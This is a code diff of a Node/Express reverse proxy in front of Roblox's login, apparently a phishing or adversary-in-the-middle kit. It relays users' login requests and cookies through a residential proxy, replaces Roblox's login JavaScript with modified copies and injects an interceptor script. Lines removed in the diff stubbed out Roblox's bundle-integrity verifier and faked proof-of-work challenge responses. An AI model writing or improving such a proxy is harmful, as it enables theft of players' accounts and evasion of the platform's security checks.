@@ -69,21 +69,6 @@ const CHALLENGE_HEADERS = [
     'x-retry-attempt',
 ];
 
-// Cache for PoW challenge metadata keyed by challengeId
-// Stores the original rblx-challenge-metadata from the login 403
-// so we can rebuild the correct retry metadata after PoW solve
-const powMetadataCache = new Map();
-
-// ─────────────────────────────────────────────────────────────
-// SILENCE bundleVerifier.js — no file needed, served inline
-// Catches both the CDN hash version and the /js/utilities/ path
-// ─────────────────────────────────────────────────────────────
-app.get(/bundleVerifier\.js/, (req, res) => {
-    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
-    res.setHeader('Cache-Control', 'public, max-age=86400');
-    res.send(`var Roblox=Roblox||{};Roblox.BundleDetector=(function(){return{jsBundlesLoaded:{},bundlesReported:{},counterNames:{},loadStates:{},bundleContentTypes:{},timing:undefined,setTiming:function(){},getLoadTime:function(){return 0;},getCurrentTime:function(){return Date.now();},getCdnProviderName:function(u,cb){cb();},getCdnProviderAndReportMetrics:function(){},reportMetrics:function(){},logToEphemeralCounter:function(){},logToEventStream:function(){},getCdnInfo:function(){},reportBundleError:function(){},bundleDetected:function(n){this.jsBundlesLoaded[n]=true;},verifyBundles:function(){}};})();`);
-});
-
 // ─────────────────────────────────────────────────────────────
 // SERVE MODIFIED JS FILES
 // ─────────────────────────────────────────────────────────────
@@ -375,42 +360,8 @@ async function loginHandler(req, res) {
             const csrfFromCookie = cookies.match(/X-CSRF-TOKEN=([^;]+)/i)?.[1] ||
                                    cookies.match(/csrf-token=([^;]+)/i)?.[1] || null;
 
-            // ── PoW metadata rebuild ──────────────────────────────────
-            // The browser sends a minimal rblx-challenge-metadata blob
-            // {redemptionToken, sessionId} but Roblox requires the full
-            // original structure. Rebuild it from the cache here.
-            const challengeHeaders = { ...req.headers };
-            const incomingChallengeId = req.headers['rblx-challenge-id'] || '';
-            const incomingMeta = req.headers['rblx-challenge-metadata'] || '';
-            const incomingType = req.headers['rblx-challenge-type'] || '';
-
-            if (incomingType === 'proofofwork' && incomingChallengeId && incomingMeta) {
-                const cachedRaw = powMetadataCache.get(incomingChallengeId);
-                if (cachedRaw) {
-                    try {
-                        // Decode browser's minimal blob to get redemptionToken
-                        const browserMeta = JSON.parse(Buffer.from(incomingMeta, 'base64').toString('utf8'));
-                        const redemptionToken = browserMeta.redemptionToken || '';
-
-                        // Rebuild full structure from cache, fill in redemptionToken
-                        const cachedObj = JSON.parse(Buffer.from(cachedRaw, 'base64').toString('utf8'));
-                        cachedObj.redemptionToken = redemptionToken;
-                        const fullMeta = Buffer.from(JSON.stringify(cachedObj)).toString('base64');
-
-                        challengeHeaders['rblx-challenge-metadata'] = fullMeta;
-                        console.log(`   PoW metadata rebuilt for ${incomingChallengeId.slice(0,20)}...`);
-                        console.log(`   redemptionToken: ${redemptionToken.slice(0,16)}...`);
-                        powMetadataCache.delete(incomingChallengeId);
-                    } catch (e) {
-                        console.warn(`   Failed to rebuild PoW metadata: ${e.message}`);
-                    }
-                } else {
-                    console.warn(`   No cached metadata for ${incomingChallengeId} — sending as-is`);
-                }
-            }
-
             // Try with cookie CSRF first, then do the dance if needed
-            let result = await doLoginWithRetry(bodyStr, cookies, csrfFromCookie, ua, challengeHeaders);
+            let result = await doLoginWithRetry(bodyStr, cookies, csrfFromCookie, ua, req.headers);
             console.log(`   Challenge login attempt 1: ${result.statusCode}`);
 
             if (result.statusCode === 403 && result.headers['x-csrf-token']) {
@@ -421,7 +372,7 @@ async function loginHandler(req, res) {
                     const extra = [].concat(result.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                     cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                 }
-                result = await doLoginWithRetry(bodyStr, cookieHeader, csrfToken, ua, challengeHeaders);
+                result = await doLoginWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
                 console.log(`   Challenge login attempt 2: ${result.statusCode}`);
             }
 
@@ -457,19 +408,7 @@ async function loginHandler(req, res) {
         }
 
         if (final.statusCode === 200) console.log('✅ LOGIN SUCCESS');
-        else if (final.headers['rblx-challenge-id']) {
-            console.log('🧩 Challenge required');
-            // Cache original metadata so PoW short-circuit can rebuild the correct retry blob
-            const cid = final.headers['rblx-challenge-id'];
-            const meta = final.headers['rblx-challenge-metadata'];
-            if (cid && meta) {
-                powMetadataCache.set(cid, meta);
-                // Clean up old entries (keep max 100)
-                if (powMetadataCache.size > 100) {
-                    powMetadataCache.delete(powMetadataCache.keys().next().value);
-                }
-            }
-        }
+        else if (final.headers['rblx-challenge-id']) console.log('🧩 Challenge required');
         else console.log(`❌ Login failed: ${final.statusCode}`);
 
         forwardLoginResponse(res, final, host, origin, deviceId);
@@ -506,83 +445,12 @@ app.use('/challenge/v1/continue', express.raw({ type: '*/*' }), async (req, res)
             bodyObj = {};
         }
 
-        const originalType = bodyObj.challengeType || 'unknown';
-        const challengeId   = bodyObj.challengeID || bodyObj.challengeId || '';
-        console.log(`[challenge/continue] Challenge type (original): ${originalType}`);
-        console.log(`[challenge/continue] Challenge ID: ${challengeId}`);
+        console.log(`[challenge/continue] Challenge type: ${bodyObj.challengeType || 'unknown'}`);
+        console.log(`[challenge/continue] Challenge ID: ${bodyObj.challengeID || bodyObj.challengeId || 'none'}`);
 
-        // ─────────────────────────────────────────────────────────
-        // PROOF OF WORK SHORT-CIRCUIT
-        // When challengeType is "proofofwork", Roblox sets useContinueMode: false
-        // in the challenge metadata — meaning /challenge/v1/continue must NOT be called.
-        // The PoW solution was already validated by /proof-of-work-service/v1/pow-puzzle.
-        // We intercept here and return a fake 200 so Challenge.js proceeds straight
-        // to retrying login with the redemptionToken in rblx-challenge-metadata.
-        // ─────────────────────────────────────────────────────────
-        if (originalType === 'proofofwork') {
-            // Parse metadata to extract redemptionToken and sessionId
-            let powMeta = {};
-            try {
-                const raw = bodyObj.challengeMetadata;
-                powMeta = typeof raw === 'string' ? JSON.parse(raw) : (raw || {});
-            } catch (e) {}
-
-            const redemptionToken = powMeta.redemptionToken || '';
-
-            console.log(`[challenge/continue] PoW short-circuit — skipping /continue`);
-            console.log(`[challenge/continue] redemptionToken: ${redemptionToken.slice(0, 16)}...`);
-
-            // Rebuild the FULL original metadata structure from the cached login 403 response
-            // Roblox requires the complete blob (with requestPath, sharedParameters etc)
-            // with redemptionToken filled in — not just {redemptionToken, sessionId}
-            let retryMetadata;
-            const cachedRaw = powMetadataCache.get(challengeId);
-            if (cachedRaw) {
-                try {
-                    const cachedObj = JSON.parse(Buffer.from(cachedRaw, 'base64').toString('utf8'));
-                    cachedObj.redemptionToken = redemptionToken;
-                    retryMetadata = Buffer.from(JSON.stringify(cachedObj)).toString('base64');
-                    console.log(`[challenge/continue] Using cached full metadata for ${challengeId}`);
-                    // Note: cache entry kept — loginHandler will use and delete it on the actual retry
-                } catch (e) {
-                    console.warn(`[challenge/continue] Failed to parse cached metadata: ${e.message}`);
-                }
-            }
-
-            if (!retryMetadata) {
-                // Fallback: minimal blob (may still fail but better than nothing)
-                const sessionId = powMeta.sessionId || '';
-                retryMetadata = Buffer.from(JSON.stringify({ redemptionToken, sessionId })).toString('base64');
-                console.warn(`[challenge/continue] No cached metadata found for ${challengeId} — using minimal fallback`);
-            }
-
-            // Return a 200 that mimics what /continue would return for PoW
-            // challengeType: "" signals Challenge.js to proceed to login retry
-            setCors(res, origin);
-            return res.status(200).json({
-                challengeType: '',
-                challengeId:   challengeId,
-                challengeMetadata: retryMetadata,
-            });
-        }
-
-        // Force challengeType to "chef" for captcha/other challenge types
-        // Official network log confirms challenge/continue must always send "chef"
-        bodyObj.challengeType = 'chef';
-
-        // Normalize challengeID key (some clients send challengeId, Roblox wants challengeID)
-        if (bodyObj.challengeId && !bodyObj.challengeID) {
-            bodyObj.challengeID = bodyObj.challengeId;
-            delete bodyObj.challengeId;
-        }
-
-        // Rebuild challengeMetadata as a JSON string if it arrived as an object
-        if (bodyObj.challengeMetadata && typeof bodyObj.challengeMetadata === 'object') {
-            bodyObj.challengeMetadata = JSON.stringify(bodyObj.challengeMetadata);
-        }
-
-        const fixedBodyStr = JSON.stringify(bodyObj);
-        console.log(`[challenge/continue] Fixed body → ${fixedBodyStr.substring(0, 200)}`);
+        // FIXED: Roblox now uses "chef" challenge type, not "captcha"
+        // The challenge metadata format has changed significantly
+        // We need to pass through the exact format the client sends
 
         const headers = {
             'Content-Type':    'application/json;charset=UTF-8',
@@ -606,7 +474,7 @@ app.use('/challenge/v1/continue', express.raw({ type: '*/*' }), async (req, res)
         const url = 'https://apis.roblox.com/challenge/v1/continue';
 
         // Use residential proxy for challenge continue (high security endpoint)
-        const result = await makeCurlRequest('POST', url, headers, Buffer.from(fixedBodyStr, 'utf8'), true);
+        const result = await makeCurlRequest('POST', url, headers, Buffer.from(bodyStr, 'utf8'), true);
 
         console.log(`[challenge/continue] ← ${result.statusCode}`);
 
@@ -1132,9 +1000,9 @@ app.use('/', createProxyMiddleware({
             proxyReq.setHeader('user-agent',      req.headers['user-agent'] || BROWSER_UA);
             proxyReq.setHeader('accept',          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
             proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
-            proxyReq.setHeader('accept-encoding', 'identity');
+            proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
         },
-        
+
         proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
             const host   = req.headers.host || 'localhost';
             const origin = req.headers['origin'] || `https://${host}`;
@@ -1156,14 +1024,7 @@ app.use('/', createProxyMiddleware({
             const ct = proxyRes.headers['content-type'] || '';
             if (!ct.includes('text/html')) return buffer;
 
-
             let body = buffer.toString('utf8');
-
-           // 🚫 REMOVE bundleVerifier injected by Roblox
-            body = body.replace(/<script[^>]*>\s*var Roblox\s*=\s*Roblox[^<]*BundleVerifierConstants[\s\S]*?<\/script>/gi, '');
-            body = body.replace(/<script[^>]*bundleVerifier\.js[^>]*><\/script>/gi, '');
-
-           console.log('[main] 🚫 bundleVerifier removed');
 
             // Replace the 4 Roblox JS files with our modified local versions
             body = body.replace(
@@ -1180,8 +1041,10 @@ app.use('/', createProxyMiddleware({
             );
             body = body.replace(
                 /https?:\/\/[^"']*\/[a-f0-9]+-ReactLogin\.js[^"']*/g,
-                `/js/ReactLogin.js?v=1`
+                `/js/ReactLogin.js`
             );
+            // Handle ?v=N versioned references too
+            body = body.replace(/\/js\/ReactLogin\.js\?v=\d+/g, '/js/ReactLogin.js');
 
             // Inject meta tags + interceptor script
             const metaTags = generateProxyMetaTags();
